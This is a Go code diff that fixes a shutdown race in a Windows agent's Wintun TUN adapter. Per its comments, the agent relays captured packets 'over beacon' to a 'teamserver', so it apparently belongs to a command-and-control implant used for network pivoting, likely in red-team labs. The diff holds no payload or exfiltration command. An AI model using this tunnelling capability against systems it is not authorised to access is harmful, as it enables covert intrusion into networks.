@@ -15,6 +15,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"syscall"
+	"time"
 
 	"golang.org/x/sys/windows"
 	"golang.zx2c4.com/wintun"
@@ -39,6 +40,10 @@ const (
 	// wintunStopWaitMillis bounds the read-loop wait so stopAgentTUN cannot
 	// leave the goroutine parked on the session event indefinitely.
 	wintunStopWaitMillis = 500
+	// wintunStopGrace bounds how long stopAgentTUN waits for the read loop to
+	// leave the Wintun DLL before it ends the session. The loop checks the
+	// stop flag between DLL calls, so the wait is normally sub-second.
+	wintunStopGrace = 3 * time.Second
 )
 
 // wintunAdapterGUID pins the adapter's NLA identity: a stable GUID makes
@@ -57,6 +62,9 @@ var (
 	wintunSess    wintun.Session
 	wintunUp      bool
 	wintunStop    atomic.Bool
+	// wintunReadDone closes when the read-loop goroutine returns, so the stop
+	// path can prove no Wintun DLL call is in flight before End()/Close().
+	wintunReadDone chan struct{}
 )
 
 // wintunElevationHint appends the actionable reason when the adapter could not
@@ -93,13 +101,15 @@ func startAgentTUN(cidr string) (string, error) {
 		return "", fmt.Errorf("tun_start: start Wintun session: %w", err)
 	}
 	warning := wintunConfigureIPv4(wintunAdapterName, ip, ipnet)
+	done := make(chan struct{})
 	wintunMu.Lock()
 	wintunAdapter = adapter
 	wintunSess = session
 	wintunUp = true
-	wintunMu.Unlock()
+	wintunReadDone = done
 	wintunStop.Store(false)
-	go wintunReadLoop(session)
+	wintunMu.Unlock()
+	go wintunReadLoop(session, done)
 	socksEnqueueOut(0, "tun_up", []byte(wintunAdapterName+" "+cidr))
 	msg := fmt.Sprintf("tun %s up addr=%s (packets framed over beacon as tun_data; pair with teamserver UDP helper)", wintunAdapterName, ip.String())
 	if warning != "" {
@@ -111,10 +121,21 @@ func startAgentTUN(cidr string) (string, error) {
 func stopAgentTUN() error {
 	wintunStop.Store(true)
 	wintunMu.Lock()
-	adapter, session, up := wintunAdapter, wintunSess, wintunUp
-	wintunAdapter, wintunSess, wintunUp = nil, wintun.Session{}, false
-	wintunMu.Unlock()
+	adapter, session, up, done := wintunAdapter, wintunSess, wintunUp, wintunReadDone
+	wintunAdapter, wintunSess, wintunUp, wintunReadDone = nil, wintun.Session{}, false, nil
 	if up {
+		// The read loop polls the stop flag between Wintun DLL calls; wait for
+		// it to return before End(), or an in-flight ReceivePacket touches the
+		// freed session (measured: 0xc0000005 in ReceivePacket during the
+		// elevated lab run on 2026-10-17). Holding the lock across the
+		// teardown equally keeps tunWritePacket from entering
+		// AllocateSendPacket while the session goes away.
+		if done != nil {
+			select {
+			case <-done:
+			case <-time.After(wintunStopGrace):
+			}
+		}
 		session.End()
 		if adapter != nil {
 			// Closing the adapter removes it; Wintun keeps the driver
@@ -122,6 +143,7 @@ func stopAgentTUN() error {
 			_ = adapter.Close()
 		}
 	}
+	wintunMu.Unlock()
 	socksEnqueueOut(0, "tun_down", nil)
 	return nil
 }
@@ -137,9 +159,13 @@ func tunEnqueue(pkt []byte) {
 // wintunReadLoop drains captured IP packets into the beacon's tun_data queue.
 // The packet slice points into the session ring, so it is copied before being
 // released for reuse.
-func wintunReadLoop(session wintun.Session) {
+func wintunReadLoop(session wintun.Session, done chan struct{}) {
+	defer close(done)
 	event := session.ReadWaitEvent()
 	for {
+		if wintunStop.Load() {
+			return
+		}
 		pkt, err := session.ReceivePacket()
 		if err != nil {
 			if !errors.Is(err, windows.ERROR_NO_MORE_ITEMS) {
@@ -169,19 +195,19 @@ func tunWritePacket(pkt []byte) {
 	if len(pkt) == 0 {
 		return
 	}
+	// The lock is held across the DLL calls so a concurrent stopAgentTUN
+	// cannot end the session mid-flight.
 	wintunMu.Lock()
-	up := wintunUp
-	session := wintunSess
-	wintunMu.Unlock()
-	if !up {
+	defer wintunMu.Unlock()
+	if !wintunUp {
 		return
 	}
-	buf, err := session.AllocateSendPacket(len(pkt))
+	buf, err := wintunSess.AllocateSendPacket(len(pkt))
 	if err != nil {
 		return // ring full: drop, mirroring the Linux write path's best-effort semantics
 	}
 	copy(buf, pkt)
-	session.SendPacket(buf)
+	wintunSess.SendPacket(buf)
 }
 
 // wintunConfigureIPv4 assigns the requested CIDR to the adapter with netsh
